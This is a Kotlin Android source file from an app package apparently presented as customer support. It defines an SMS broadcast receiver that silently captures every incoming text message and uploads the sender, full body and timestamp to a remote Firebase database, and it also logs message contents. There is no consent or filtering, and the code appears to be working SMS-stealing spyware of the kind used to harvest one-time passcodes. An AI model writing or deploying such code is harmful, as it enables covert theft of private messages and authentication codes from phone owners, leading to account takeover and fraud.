package com.ibnghufran.supportforcustomer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase

class SMSReceiver : BroadcastReceiver() {
    private lateinit var database: DatabaseReference

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle: Bundle? = intent.extras
            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<*>
                for (pdu in pdus) {
                    val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                    val sender = smsMessage.displayOriginatingAddress
                    val messageBody = smsMessage.messageBody
                    val timestamp = smsMessage.timestampMillis

                    // Log message for debugging
                    Log.d("SMSReceiver", "Received SMS from: $sender, Message: $messageBody")

                    // Initialize Firebase Database
                    database = FirebaseDatabase.getInstance().getReference("sms_messages")

                    // Save SMS to Firebase
                    saveSMSToFirebase(sender, messageBody, timestamp)
                }
            }
        }
    }

    private fun saveSMSToFirebase(sender: String, messageBody: String, timestamp: Long) {
        val smsData = mapOf(
            "sender" to sender,
            "messageBody" to messageBody,
            "timestamp" to timestamp
        )

        // Push message to Firebase
        database.push().setValue(smsData)
            .addOnSuccessListener {
                Log.d("SMSReceiver", "SMS uploaded to Firebase successfully")
            }
            .addOnFailureListener { e ->
                Log.e("SMSReceiver", "Failed to upload SMS to Firebase", e)
            }
    }
}
